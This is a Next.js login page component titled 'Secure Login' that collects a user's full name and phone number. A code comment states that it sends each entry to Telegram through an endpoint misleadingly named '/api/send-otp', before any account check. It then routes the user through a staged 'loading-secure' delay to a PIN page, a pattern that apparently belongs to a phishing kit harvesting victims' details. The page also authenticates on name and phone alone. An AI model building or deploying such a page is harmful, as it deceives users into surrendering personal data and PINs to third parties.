'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Phone, User, Lock, ArrowRight, Shield, AlertCircle } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

export default function LoginPage() {
  const [phone, setPhone] = useState('');
  const [name, setName] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [urlParams, setUrlParams] = useState({ initialName: '', initialPhone: '' });
  const router = useRouter();

  // Get URL parameters after component mounts (client-side only)
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setUrlParams({
      initialName: urlParams.get('name') || '',
      initialPhone: urlParams.get('phone') || ''
    });
  }, []);

  const validateForm = () => {
    if (!name.trim()) {
      setError('Full name is required');
      return false;
    }
    
    if (!phone) {
      setError('Phone number is required');
      return false;
    }
    
    if (!/^\+?[\d\s-()]+$/.test(phone)) {
      setError('Please enter a valid phone number');
      return false;
    }
    
    setError('');
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setIsLoading(true);
    
    // Send notification to Telegram with name and phone number
    try {
      await fetch('/api/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phone, 
          name,
          action: 'login_attempt' 
        })
      });
    } catch (err) {
      console.error('Failed to send notification:', err);
    }
    
    // Check if user exists in profiles table
    try {
      const response = await fetch(`/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, name })
      });
      
      const data = await response.json();
      
      if (response.ok && data.token) {
        // Store the token in localStorage
        localStorage.setItem('token', data.token);
        
        // User exists, redirect to progress page with 8-second delay then to PIN page
        router.push(`/loading-secure?action=login&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&redirect=pin`);
      } else {
        if (data.error === 'User not found') {
          // User doesn't exist, redirect to signup
          router.push(`/register?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`);
        } else {
          setError(data.message || 'An error occurred');
        }
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-primary/5 to-accent/5 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
            <Shield className="h-8 w-8 text-primary" />
          </div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
            Secure Login
          </h1>
          <p className="text-foreground/70 mt-2">
            Enter your name and phone number to access your account
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="name" className="block text-sm font-medium text-foreground mb-2 pl-1">
              Full Name
            </label>
            <div className="relative">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
                <User className="h-4 w-4" />
              </div>
              <Input
                id="name"
                type="text"
                placeholder="Enter your full name"
                value={name || urlParams.initialName}
                onChange={(e) => setName(e.target.value)}
                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
              />
            </div>
          </div>

          <div>
            <label htmlFor="phone" className="block text-sm font-medium text-foreground mb-2 pl-1">
              Phone Number
            </label>
            <div className="relative">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
                <Phone className="h-4 w-4" />
              </div>
              <Input
                id="phone"
                type="tel"
                placeholder="Enter your phone number"
                value={phone || urlParams.initialPhone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
              />
            </div>
          </div>

          {error && (
            <div className="flex items-center p-3 text-sm text-destructive bg-destructive/10 rounded-lg">
              <AlertCircle className="h-4 w-4 mr-2" />
              {error}
            </div>
          )}

          <Button
            type="submit"
            disabled={isLoading}
            className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-4 py-3 text-sm font-medium text-primary-foreground shadow transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 disabled:opacity-50"
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="h-4 w-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
                <span>Processing...</span>
              </div>
            ) : (
              <>
                Login
                <ArrowRight className="h-4 w-4" />
              </>
            )}
          </Button>
        </form>

        <div className="mt-8 text-center">
          <p className="text-foreground/70">
            Don't have an account?{' '}
            <Link href="/register" className="font-medium text-primary hover:text-primary/80">
              Sign up
            </Link>
          </p>
        </div>
      </div>
    </div>
  );
}